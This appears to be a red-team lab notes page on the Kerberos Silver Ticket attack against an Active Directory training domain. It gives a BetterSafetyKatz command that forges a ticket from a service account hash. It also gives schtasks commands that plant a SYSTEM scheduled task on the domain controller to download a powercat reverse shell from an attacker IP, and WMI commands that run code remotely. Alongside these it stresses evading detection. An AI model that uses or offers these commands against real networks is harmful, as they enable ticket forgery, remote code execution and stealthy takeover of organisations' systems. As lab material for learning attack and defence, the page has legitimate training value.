# Silver Ticket

Silver ticket is signed and encrypted by the **hash of service account** which makes it a **valid TGS ticket**.

## Pre-reqs:

* Hash of the service/machine

## Validity

By default the machine accounts passwords are changed every 30 days, can be changed on-demand prior to that time as well.

## Info

Pros: This is a very stealth attack. Since most of the security solutions like MDI are focused more on the DC, so here in silver ticket we aren't interacting with the DC maliciously in any way, we are forging the ticket using the machine account's hash, so the chances of getting detected is very low.

* Services rarely check PAC (Privileged Attribute Certificate)
* Services will allow access only to the services themselves.
* Reasonable persistence period (default 30 days for computer accounts)

## Create The Ticket

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden 
/User:Administrator /domain:dollarcorp.moneycorp.local
/sid:S-1-5-21-719815819-3726368948-3917688648 
/target:dcorp-dc.dollarcorp.moneycorp.local
/service:CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 
/startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

<table><thead><tr><th width="318">Options</th><th width="431"></th></tr></thead><tbody><tr><td>kerberos::golden</td><td>Name of the module</td></tr><tr><td>/User:Administrator</td><td>Username for which the TGT is generated</td></tr><tr><td>/domain:</td><td>Domain FQDN</td></tr><tr><td>/sid:</td><td>SID of the domain</td></tr><tr><td>/target:</td><td>Target server FQDN</td></tr><tr><td>/service:</td><td>The SPN name of service for which TGS is to be created</td></tr><tr><td>/aes256:</td><td>AES256 keys of the krbtgt account</td></tr><tr><td>/id:500 /groups:512</td><td>Optional User and Group RID</td></tr><tr><td>/ptt</td><td>ptt: inject ticket to current process</td></tr><tr><td>/startoffset:0</td><td>Optional when the ticket is available in minutes.<br>Use negative for a ticket available from past and a larger number for future.</td></tr><tr><td>/endin:600</td><td>Optional ticket lifetime in minutes. (default <strong>10</strong> years)<br>The default AD setting is 10 hours = 600 minutes</td></tr><tr><td>/renewmax:10080</td><td>Optional ticket lifetime with renewal in minutes. (default is <strong>10</strong> years)<br>The default AD setting is 7 days = 100800</td></tr></tbody></table>

## Abusing Services

### HOST

HOST Service permission allows to create scheduled tasks in remote computers\
The Silver ticket needs to be created with the NT Hash of the target machine

```bash
# Check you have permissions 
schtasks /S dcorp-dc.dollarcorp.moneycorp.local

#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Job" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.83/powercat.ps1''')'"

#Run created schtask now
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "Job"
```

### HOST + RPCSS

With these tickets you can **execute WMI in the victim system**:

```bash
#Check you have permissions 
Invoke-WmiMethod -class win32_operatingsystem -ComputerName dcorp-dc

# Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$Program"

gwmi -class win32_operatingsystem -ComputerName dcorp-dc  
```
